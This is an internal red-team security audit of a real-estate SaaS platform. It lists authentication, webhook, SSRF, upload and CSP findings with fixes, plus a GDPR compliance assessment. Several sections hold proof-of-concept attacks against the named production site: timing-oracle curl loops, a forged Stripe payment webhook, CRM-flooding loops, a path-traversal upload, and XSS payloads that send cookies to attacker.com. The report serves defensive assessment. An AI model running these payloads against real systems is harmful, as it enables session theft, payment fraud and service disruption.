# SECURITY ATTACK REPORT — SH-ROS Certification
**Agency Group · AMI 22506 · Next.js 14 App Router / Supabase / Vercel**
**Audit Date:** 2026-05-17 | **Auditor:** Red Team (adversarial, GDPR focus)
**Classification:** CONFIDENTIAL — INTERNAL ONLY

---

## Executive Summary

The SH-ROS production system has completed a meaningful hardening cycle. The four specifically-flagged fixes (timingSafeEqual, x-vercel-cron bypass removal, upload batch limit, XML escaping) are all correctly implemented. Six material attack vectors remain open, of which two are CRITICAL: (1) the POST handler in `radar/digest` uses a plain `===` string comparison instead of timingSafeEqual, and (2) the `distribution/invite` POST endpoint is entirely unauthenticated with no rate limit, allowing unbounded spam-registration of fake agents into the CRM. GDPR compliance is partially achieved but contains two gaps: the delete-account route does not purge `contacts` or `leads` tables, and no consent-capture audit log exists.

---

## Authentication Surface Analysis

### Surface 1 — `lib/portalAuth.ts` + `lib/requirePortalAuth.ts`

**Design:** Three-branch auth — service tokens (CRON_SECRET / INTERNAL_API_TOKEN), NextAuth v5 session (Google OAuth), magic-link HMAC-SHA256 cookie.

**HMAC verification:** Both files implement timingSafeEqual correctly. Buffer length is checked before calling timingSafeEqual. The try/catch correctly swallows exceptions (e.g., odd-length hex string inputs) and returns false.

**Token payload validation:** `data.email && Date.now() < data.exp` — correct. No type-confusion possible because payload is base64url-decoded then JSON.parsed in a separate try/catch.

**Service token comparison:** Lines 21-22 in `portalAuth.ts` use plain `===` for `incoming === cronSecret` and `incoming === internalToken`. This is a timing oracle. However, because these are server-side environment variables (not user-controlled secrets used to derive user data), the practical exploitability is low — an attacker would need to measure server-to-server timing differences across a WAN, which is dominated by network jitter. Severity: LOW-MEDIUM.

**Attack scenario:**
```
# Timing oracle on CRON_SECRET via portalAuth.ts path
for prefix in $(seq 0 255 | awk '{printf "%02x", $1}'); do
  time curl -s -H "x-cron-secret: ${prefix}xxxxxxxx..." https://www.agencygroup.pt/api/radar/digest
done
# Statistically rank response times to enumerate secret byte-by-byte
```

### Surface 2 — `middleware.ts` Portal Guard

**Design:** Validates `ag-auth-token` (URL param or cookie) using Web Crypto HMAC-SHA256. Falls back to redirect `/portal/login`.

**CRITICAL FINDING — Non-constant-time string comparison in middleware:**
```javascript
// middleware.ts line 53:
if (sigHex !== sig) return false
```
This is a plain JavaScript string comparison — NOT constant-time. An attacker can perform a timing oracle attack against the middleware HMAC validation to forge a portal session token byte-by-byte.

**PoC:**
```bash
# Measure response time for each hex prefix (automate with 10,000 requests per candidate)
curl -v --cookie "ag-auth-token=<payload>.<prefix>000...0" \
  https://www.agencygroup.pt/portal/dashboard
# Statistically significant timing differences reveal correct hex digits
# Full signature = 64 hex chars → 16^64 reduced to 16×64 = 1024 attempts
```

**Economic impact:** Full portal access. Exposure of all CRM data (contacts, leads, deals), confidential investor pipeline, property AI analysis. EUR impact: €50,000–€500,000 (data breach regulatory fine GDPR Art. 83 + business damage + competitor intelligence).

**Severity: HIGH**

### Surface 3 — `app/api/auth/request/route.ts`

**Rate limiting:** 5 requests/hour per IP using Upstash sliding window (ZADD/ZREMRANGEBYSCORE/ZCARD). Correctly implemented. Falls back to `{ allowed: true }` if Upstash is unavailable — this means if Upstash goes down, the endpoint becomes unprotected.

**Email enumeration:** The endpoint returns identical `{ ok: true }` for both approved and unapproved emails. No timing difference is observable. Good.

**Resend API key exposure path:** The Resend key lives in an environment variable and is never echoed in responses. Good.

**Token generation:** `makeToken` uses HMAC-SHA256. 24h expiry. Magic tokens include `type: 'magic'` in payload. Approval tokens use `type: 'approval'`. The approval flow sends HMAC-signed links to admin email. If admin email is compromised, full agent access is grantable. Acceptable risk for a 2-person agency.

**Attack — Upstash failopen:**
```bash
# If Upstash REST endpoint returns non-200 (network error, rate limit on Upstash itself):
# The catch block returns { allowed: true, remaining: 5 }
# → unlimited magic-link requests, potential email spam to admin
```
Severity: MEDIUM (depends on Upstash SLA).

### Surface 4 — `app/api/auth/me/route.ts`

**Implementation:** HMAC verification using `safeCompare` (which wraps timingSafeEqual). No-cache headers on every response. Expiry check. Clean.

**Cookie name dual-path:** Accepts both `__Secure-ag-auth-token` and `ag-auth-token`. The `__Secure-` prefix variant requires HTTPS — correct. The non-prefixed variant is also accepted, which means a downgrade to HTTP (only possible if HSTS is stripped by a MitM) could be used to set a cookie without the Secure prefix that is accepted. In Vercel production this is not exploitable because HSTS is set to 2 years with preload. Acceptable.

### Surface 5 — `app/api/stripe/webhook/route.ts`

**CRITICAL CONFIGURATION RISK:** Lines 22-26:
```javascript
const webhookSecret = process.env.STRIPE_WEBHOOK_SECRET
if (!webhookSecret || webhookSecret === 'whsec_PLACEHOLDER') {
  console.warn('[webhook] STRIPE_WEBHOOK_SECRET not configured — skipping verification')
  return NextResponse.json({ received: true })
}
```
If `STRIPE_WEBHOOK_SECRET` is missing or left as the placeholder value, ALL webhook events are accepted without signature verification. An attacker can forge arbitrary Stripe events (e.g., `checkout.session.completed` with `payment_status: 'paid'`), granting subscription access to any email address without payment.

**PoC — Subscription fraud without payment:**
```bash
curl -X POST https://www.agencygroup.pt/api/stripe/webhook \
  -H "Content-Type: application/json" \
  -H "stripe-signature: fake" \
  -d '{
    "type": "checkout.session.completed",
    "data": {
      "object": {
        "mode": "subscription",
        "payment_status": "paid",
        "status": "complete",
        "customer": "cus_fake",
        "subscription": "sub_fake",
        "metadata": {
          "customer_email": "attacker@evil.com",
          "plan": "intelligence"
        }
      }
    }
  }'
# If STRIPE_WEBHOOK_SECRET is placeholder → subscription activated for free
```

**Economic impact:** Free access to paid subscription tiers. Loss of subscription revenue. Each subscription at ~€99/month × potentially unlimited fake accounts. EUR impact: €5,000–€50,000/year depending on pricing.

**Severity: CRITICAL if placeholder is deployed; LOW if correctly set.**

**Action required:** Verify Vercel production env has a real `STRIPE_WEBHOOK_SECRET` value starting with `whsec_` (not the placeholder).

### Surface 6 — `app/api/whatsapp/webhook/route.ts`

**HMAC verification:** Correctly implemented. Raw body is read first, then HMAC-SHA256 with `timingSafeEqual`. Missing `WHATSAPP_APP_SECRET` → 503 (fail-closed). Good.

**FINDING — timingSafeEqual length mismatch not guarded:**
```javascript
// line 67:
if (!timingSafeEqual(Buffer.from(sig), Buffer.from(expected)))
```
`Buffer.from(sig)` where `sig` is a header value. If `sig` is shorter or longer than `expected`, `timingSafeEqual` will throw. The code wraps this in a try/catch that returns 403, so it fails safely. However, the error path logs a warning which could be used by an attacker to confirm the header format is being parsed. Minor.

**Prompt injection:** User message is sanitized (strips `[INST]`, system prompt patterns). 2000-char limit enforced. `classifyIntent` is regex-based. Injection of adversarial payload into CRM `notas` field — `text.slice(0, 500)` stored directly into `notas` column without sanitization. Could contain XSS payloads if the portal renders this without escaping. Severity: MEDIUM (CRM stored XSS).

**PoC — Stored XSS via WhatsApp:**
```
# Send WhatsApp message to the business number:
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

# This gets stored in contacts.notas as:
# "Mensagem WhatsApp: "<script>fetch(...)</script>""
# If the portal renders notas as raw HTML → XSS fires for any agent viewing the contact
```

**Economic impact:** Session hijacking of any portal agent. Full CRM access. EUR impact: €20,000–€100,000.

**Severity: MEDIUM-HIGH** (depends on portal rendering of `notas` field).

### Surface 7 — `app/api/test-smtp/route.ts`

**Auth:** `safeCompare(auth, "Bearer ${ADMIN_SECRET}")`. Constant-time. Good.

**FINDING — SMTP error response leaks internal configuration:**
```javascript
return NextResponse.json({
  success: false,
  error: err.message,   // SMTP banner / error string — may contain server version
  code: err.code,
  command: err.command,
  response: err.response,   // FULL SMTP server response
  responseCode: err.responseCode,
  config: { host: smtpHost, port: smtpPort, secure: smtpSecure },
})
```
If `ADMIN_SECRET` is weak or guessed, the error response on SMTP failure exposes the SMTP hostname, port, and full server banner. However, this endpoint is admin-only and behind ADMIN_SECRET. Acceptable risk if ADMIN_SECRET is strong.

### Surface 8 — `app/api/sentry-test/route.ts`

Protected by `ADMIN_SECRET` via `safeCompare`. No findings. Correct implementation.

### Surface 9 — `app/api/radar/digest/route.ts`

**VERIFIED FIX — x-vercel-cron bypass removed:** Confirmed. The `isAuthorized` function no longer accepts `x-vercel-cron` as a valid credential. Only `CRON_SECRET` via `Authorization: Bearer` or `x-cron-secret` header is accepted.

**REMAINING FINDING — POST handler uses plain `===` comparison:**
```javascript
// POST handler, line 305:
if (secret && auth !== `Bearer ${secret}`) {
```
This is NOT constant-time. An attacker can time-oracle the CRON_SECRET from the POST handler even though the GET handler uses the `isAuthorized()` helper (which also uses `===` internally). Consistent but consistently wrong.

**PoC:**
```bash
# Enumerate CRON_SECRET via timing on POST /api/radar/digest
for byte in $(seq 0 255); do
  START=$(date +%s%N)
  curl -s -X POST https://www.agencygroup.pt/api/radar/digest \
    -H "Authorization: Bearer $(printf '%02x' $byte)xxxx..."
  END=$(date +%s%N)
  echo "$byte: $((END-START))ns"
done
```

**Economic impact:** Unauthorized digest trigger = Resend API key usage (cost), potential email spam to DIGEST_EMAIL, and exposure of deal intelligence. EUR impact: €500–€5,000.

**Severity: LOW-MEDIUM** (timing oracle across WAN is hard; impact limited).

### Surface 10 — `app/api/market-data/refresh/route.ts`

**VERIFIED FIX — x-vercel-cron bypass removed:** Confirmed. Both GET and POST handlers require CRON_SECRET. `if (!secret) return false` fail-closed. Correct.

**REMAINING FINDING — POST handler plain `===`:**
```javascript
// line 27:
if (auth !== `Bearer ${secret}`) return ...
```
Same timing oracle issue as radar/digest POST handler.

### Surface 11 — `app/api/property-ai/upload/route.ts`

**VERIFIED FIX — MAX_FILES_PER_BATCH=10:** Confirmed. Line 91 enforces the limit before processing. Returns 400 if exceeded.

**FINDING — Extension-only validation is client-controllable:**
The MIME-type validation has a critical fallback:
```javascript
const ext = filename.split('.').pop()?.toLowerCase() ?? ''
return ALLOWED_EXTENSIONS.has(ext)
```
A malicious actor authenticated to the portal can upload a file with extension `.jpg` but containing PHP/shell content. Because Supabase Storage returns raw file content at its public URL, and the bucket is `property-media` (likely public), this could be used to store and serve malicious content. This is not RCE on the server (Vercel is sandboxed), but malicious content can be served from your Supabase CDN domain. Severity: LOW (no RCE, but content abuse).

**FINDING — submissionId is user-controllable:**
```javascript
const submissionId = (formData.get('submission_id') as string) ?? crypto.randomUUID()
```
User can specify any `submission_id`, including path traversal sequences (`../../`). The storage path is `${submissionId}/${fileId}.${ext}`. Supabase Storage should sanitize this, but it warrants verification.

**PoC:**
```bash
curl -X POST https://www.agencygroup.pt/api/property-ai/upload \
  -H "Cookie: ag-auth-token=<valid_token>" \
  -F "submission_id=../../admin" \
  -F "file=@payload.jpg;type=image/jpeg"
# If Supabase does not sanitize → file stored at ../../admin/<uuid>.jpg
```

**Severity: MEDIUM** (if Supabase storage allows path traversal).

### Surface 12 — `app/api/distribution/invite/route.ts`

**CRITICAL FINDING — Unauthenticated POST with no rate limiting:**

The POST handler is explicitly PUBLIC (no auth) with no rate limiting in middleware (the path `/api/distribution` is not in the LIMITS map). Any external actor can register unlimited fake agents:

```bash
# Spam the CRM with 10,000 fake agent registrations
for i in $(seq 1 10000); do
  curl -X POST https://www.agencygroup.pt/api/distribution/invite \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"spam$i@evil.com\", \"invite_code\": \"fake\"}"
done
# Result: agent_onboarding table flooded, CRM polluted, Supabase quota exhausted
```

**Economic impact:** CRM database poisoning, Supabase row quota exhaustion, potential service disruption. EUR impact: €1,000–€10,000 (remediation + data cleanup + service downtime).

**Severity: HIGH**

### Surface 13 — `lib/property-ai/ingestion/urlScraper.ts`

**VERIFIED FIX — XML tag escaping:** Confirmed. Both `</page_content>` and `<page_content>` are escaped before injection into the prompt. The escaping is correct:
```javascript
.replace(/<\/page_content>/gi, '<\\/page_content>')
.replace(/<page_content>/gi, '<\\/page_content_open>')
```

**VERIFIED FIX — SSRF guard:** Confirmed. `isBlockedUrl()` blocks localhost, 127.x, 10.x, 172.16-31.x, 192.168.x, 169.254.x (link-local), CGNAT (100.64-127.x), IPv6 ULA/link-local, and cloud metadata endpoints.

**REMAINING SSRF FINDING — DNS rebinding not protected:**
The SSRF guard checks the hostname at parse time. If the DNS for `attacker.com` returns a public IP during the check but rebinds to `169.254.169.254` (AWS metadata) during the actual `fetch()`, the guard is bypassed. This is a known limitation of hostname-only SSRF guards.

**PoC:**
1. Register `attacker.com` with DNS TTL=1s pointing to `1.2.3.4` (public)
2. Submit URL: `https://attacker.com/property`
3. `isBlockedUrl` passes (resolves to `1.2.3.4`)
4. Change DNS to `169.254.169.254`
5. Node.js `fetch()` resolves fresh DNS → hits AWS metadata endpoint

**Economic impact:** AWS/Vercel instance metadata exposure, potential credential theft. EUR impact: €10,000–€500,000 (full cloud account takeover).

**Severity: MEDIUM-HIGH** (complex to execute in Vercel serverless where function duration is short; still a real vector).

### Surface 14 — `app/api/cron/recalibrate-market/route.ts`

**Auth:** `isCronAuth()` checks `CRON_SECRET` via `x-cron-secret` or `Authorization: Bearer`. Uses plain `===` (same timing oracle as other cron endpoints). No other findings.

### Surface 15 — `next.config.ts` (CSP + Headers)

**FINDING — CSP `unsafe-inline` on `script-src`:**
```javascript
"script-src 'self' ... 'unsafe-inline' https://www.googletagmanager.com ..."
```
`unsafe-inline` on script-src renders the Content Security Policy ineffective against XSS. Any XSS vulnerability (e.g., the WhatsApp stored XSS in `contacts.notas`) can execute arbitrary scripts. Severity: HIGH (as CSP amplifier for other XSS findings).

**FINDING — X-Frame-Options conflict:**
`next.config.ts` sets `X-Frame-Options: SAMEORIGIN` while `middleware.ts` sets `X-Frame-Options: DENY`. When both are set, browsers use the first header they see. The middleware header (`DENY`) is more restrictive and takes effect for API routes. For page routes, the next.config.ts header wins (`SAMEORIGIN`). No practical attack from this specific conflict, but it indicates inconsistent hardening.

**FINDING — `img-src 'self' ... https:` (wildcard)**
The `img-src` directive ends with `https:` which allows images from ANY HTTPS origin. This is overly permissive and could be used to exfiltrate data via CSS injection (though not directly script-level).

**FINDING — `connect-src` includes `https://production-sfo.browserless.io`**
Browserless is a headless browser service. If the API key for browserless is compromised, an attacker can execute arbitrary browser sessions billed to the Agency Group account. Verify this is still in use and the key is rotated regularly.

---

## Each Fixed Vulnerability — Verification Status

| Fix | Location | Verified | Status |
|-----|----------|----------|--------|
| timingSafeEqual on HMAC cookie verification | `lib/requirePortalAuth.ts` | YES | FIXED — correctly implemented with length check + try/catch |
| timingSafeEqual on HMAC cookie verification | `lib/portalAuth.ts` | YES | FIXED — correctly implemented |
| x-vercel-cron bypass removed | `app/api/radar/digest/route.ts` | YES | FIXED — only CRON_SECRET accepted |
| x-vercel-cron bypass removed | `app/api/market-data/refresh/route.ts` | YES | FIXED — only CRON_SECRET accepted |
| MAX_FILES_PER_BATCH=10 | `app/api/property-ai/upload/route.ts` | YES | FIXED — hard limit enforced before processing |
| `</page_content>` XML escape | `lib/property-ai/ingestion/urlScraper.ts` | YES | FIXED — both opening and closing tags escaped |
| SSRF guard | `lib/property-ai/ingestion/urlScraper.ts` | YES | FIXED — comprehensive RFC-1918 + metadata endpoint blocking |

---

## Remaining Attack Vectors

### CRITICAL-1: Stripe Webhook — Unauthenticated Subscription Fraud

**Condition:** `STRIPE_WEBHOOK_SECRET` is unset or set to `whsec_PLACEHOLDER` in production.

**Exploit:**
```bash
curl -X POST https://www.agencygroup.pt/api/stripe/webhook \
  -H "Content-Type: application/json" \
  -H "stripe-signature: t=1234,v1=fake" \
  -d '{"type":"checkout.session.completed","data":{"object":{"mode":"subscription","payment_status":"paid","status":"complete","customer":"cus_fake","subscription":"sub_fake","metadata":{"customer_email":"attacker@example.com","plan":"intelligence"}}}}'
```

**Fix:** Confirm `STRIPE_WEBHOOK_SECRET` is set correctly in Vercel production environment. Add a startup check that panics if value matches placeholder.

### CRITICAL-2: `/api/distribution/invite` — Unauthenticated CRM Flooding

**Condition:** Always present (endpoint is intentionally public but has no rate limit).

**Exploit:**
```bash
seq 1 10000 | xargs -P 100 -I{} curl -s -X POST \
  https://www.agencygroup.pt/api/distribution/invite \
  -H "Content-Type: application/json" \
  -d '{"email":"spam{}@attacker.com","invite_code":"test"}'
```

**Fix:** Add `/api/distribution` to middleware `LIMITS` (e.g., max 10/hour per IP). Add email domain validation (reject disposable email domains). Add reCAPTCHA v3 on the frontend form.

### HIGH-1: Middleware Token Comparison — Timing Oracle for Portal Bypass

**Location:** `middleware.ts` line 53 — `if (sigHex !== sig) return false`

**Exploit:** Statistical timing attack across 64 hex characters of HMAC-SHA256 signature. Requires ~100,000 HTTP requests per character. Feasible with colocation or from cloud close to Vercel servers.

**Fix:** Replace with `timingSafeEqual`:
```typescript
import { timingSafeEqual } from 'crypto'
// In verifyToken():
const expected = Buffer.from(sigHex)
const provided  = Buffer.from(sig.padEnd(sigHex.length, '0'))
if (expected.length !== provided.length) return false
if (!timingSafeEqual(expected, provided)) return false
```
Note: Middleware runs in Edge Runtime (no Node.js crypto). Use Web Crypto subtle API:
```typescript
// Already imports crypto.subtle in middleware — use it for comparison too:
const expectedBytes = new Uint8Array(Buffer.from(sigHex, 'hex'))
const providedBytes = new Uint8Array(Buffer.from(sig, 'hex'))
// Compare with subtle timing-safe approach (Web Crypto doesn't expose timingSafeEqual)
// Use: crypto.subtle.verify() with HMAC which internally is constant-time
```

### HIGH-2: Stored XSS via WhatsApp → CRM `notas` Field

**Location:** `app/api/whatsapp/webhook/route.ts` — `notas: "Mensagem WhatsApp: \"${text.slice(0, 500)}\""` stored raw.

**Condition:** Portal renders `contacts.notas` as `dangerouslySetInnerHTML` or equivalent without sanitization.

**Exploit:** Send WhatsApp message: `<img src=x onerror="fetch('https://attacker.com/x?c='+document.cookie)">`

**Fix:** Sanitize `notas` before storage using `DOMPurify` (server-side: `isomorphic-dompurify`) or ensure portal uses `.textContent` / React's default safe rendering for all CRM text fields.

### MEDIUM-1: DNS Rebinding SSRF in urlScraper

**Fix:** After fetching, verify the response did not come from a private IP range by checking `X-Forwarded-For` or using a DNS-resolving SSRF proxy. Alternatively, use a cloud-provider SSRF-safe HTTP client or route all scraper requests through Browserless (already allowed in CSP) which is external and sandboxed.

### MEDIUM-2: Supabase Path Traversal via `submission_id`

**Location:** `app/api/property-ai/upload/route.ts` line 84.

**Fix:**
```typescript
const rawSubmissionId = formData.get('submission_id') as string | null
const submissionId = rawSubmissionId
  ? rawSubmissionId.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64)
  : crypto.randomUUID()
```

### MEDIUM-3: CSP `unsafe-inline` on script-src

**Fix:** Implement nonce-based CSP. Next.js 14 supports CSP nonces via `nonce` in middleware. This requires removing `'unsafe-inline'` and injecting `'nonce-<random>'` per request. This is a significant refactor but eliminates XSS escalation.

### LOW-1: Plain `===` on CRON_SECRET in cron route POST handlers

**Affected:** `radar/digest` POST, `market-data/refresh` POST, `recalibrate-market` POST.

**Fix:** Use `safeCompare()` (already available in lib) in all cron handlers:
```typescript
import { safeCompare } from '@/lib/safeCompare'
// Replace: token === secret
// With:    safeCompare(token, secret)
```

### LOW-2: Upstash Failopen in `auth/request`

**Fix:** If Upstash returns an error, fail-closed (deny) rather than fail-open (allow). Current behavior is a deliberate availability tradeoff — document it as a known acceptable risk if preferred.

### LOW-3: `X-Frame-Options` Header Conflict

**Fix:** Standardize on `DENY` in `next.config.ts` and remove from middleware to avoid duplication.

---

## GDPR Compliance Assessment

### Right to Erasure (GDPR Article 17) — `app/api/user/delete-account/route.ts`

**What is deleted:**
- `sofia_conversations` by `user_id` — YES
- `property_collections` by `agent_id` — YES
- `push_subscriptions` by `user_id` — YES
- `used_magic_tokens` by `user_id` — YES
- `profiles` by `id` — YES

**GAPS:**
1. `contacts` table — NOT deleted. If the user is also recorded as a contact (lead/buyer), their `email`, `phone`, `nome`, `notas`, and all CRM data remain in the database indefinitely. This is a GDPR Art. 17 violation.
2. `leads` table — NOT deleted. Same issue.
3. `deals` table — Deals referencing the user's email may survive. Partial data (email as string) persists.
4. `agent_onboarding` table — If the user registered via invite, their record is not deleted.
5. **No audit log of deletion.** GDPR requires the ability to demonstrate compliance. There is no `gdpr_deletion_log` table or external audit trail recording that the erasure was performed, by whom, and when.
6. **Auth account not deleted.** The NextAuth session is invalidated by cookie expiry, but if the user has a Google OAuth account in the NextAuth `accounts` and `users` tables, those rows are not deleted.

**GDPR Compliance Score: 60% (partial)**

### Right to Data Portability (GDPR Article 20) — `app/api/user/export-data/route.ts`

**What is exported:**
- `sofia_conversations` — YES
- `property_collections` — YES
- `profiles` — YES

**GAPS:**
1. `contacts` record — NOT included. If user data exists in the contacts table, it is not exported.
2. `leads` record — NOT included.
3. `push_subscriptions` — NOT included.
4. `used_magic_tokens` — NOT included (arguably not personal data, but should be disclosed).
5. No machine-readable metadata about data retention periods or processors.

**GDPR Compliance Score: 65% (partial)**

### Data Retention — `app/api/cron/purge-conversations/route.ts`

**Implementation:** Deletes `sofia_conversations` records older than 90 days. Auth uses `safeCompare` (constant-time). Fail-closed if `CRON_SECRET` is unset. Correct.

**GAPS:**
1. 90-day retention for conversations is not documented in the Privacy Policy. The retention period must be disclosed to users (GDPR Art. 13/14).
2. No purge for `contacts`, `leads`, or other personal data tables. Data in these tables accumulates indefinitely — potential violation of data minimisation (GDPR Art. 5(1)(e)).
3. `used_magic_tokens` table — accumulates indefinitely (no purge cron).

### Consent Management

**FINDING:** No consent capture table or mechanism was found in the audited routes. The platform processes personal data (WhatsApp messages → CRM, email → contacts) without visible GDPR consent checks. For GDPR compliance, consent must be captured at the point of collection and stored with timestamp and consent version.

**Legitimate interest** may apply for real estate inquiries, but this must be documented in a Record of Processing Activities (RoPA).

### GDPR Overall Assessment

| Requirement | Status | Gap |
|-------------|--------|-----|
| Right to Erasure (Art. 17) | PARTIAL | contacts/leads/deals not deleted; no audit log |
| Right to Portability (Art. 20) | PARTIAL | contacts/leads not included in export |
| Data Retention (Art. 5) | PARTIAL | Only conversations purged; no retention for other tables |
| Consent Capture (Art. 6/7) | MISSING | No consent table or mechanism found |
| Privacy Notice Accuracy (Art. 13) | UNVERIFIED | Retention periods not cross-checked with policy |
| Right of Access (Art. 15) | PARTIAL | Export exists but incomplete |

---

## Security Clearance Level

### AMBER

**Justification:**

The system has demonstrated meaningful security investment: HMAC cookie verification is correctly implemented with timingSafeEqual; cron bypass vulnerabilities have been remediated; file upload has a batch limit; prompt injection is mitigated. For a pre-Series A real estate SaaS operating in Portugal (GDPR jurisdiction), this is above average for the category.

However, the following conditions prevent GREEN clearance:

1. **Middleware timing oracle** — the portal authentication gateway uses non-constant-time string comparison, creating a theoretically exploitable path to full portal access.
2. **Unauthenticated + unrate-limited CRM write endpoint** (`/api/distribution/invite`) — an attacker can flood the CRM database trivially.
3. **GDPR gaps** — Right to Erasure is incomplete (contacts/leads not purged), and no consent mechanism was found. In Portugal, CNPD can impose fines of up to 4% of global turnover for material GDPR violations.
4. **Stripe webhook fail-open** — if the environment variable is ever lost or reset to placeholder during a Vercel environment migration, subscription fraud becomes possible without any code change.

**Path to GREEN:** Implement the four fixes above (middleware timingSafeEqual, rate limit on `/api/distribution/invite`, complete GDPR erasure, Stripe webhook env validation), and add a consent table. Estimated effort: 2–3 engineering days.
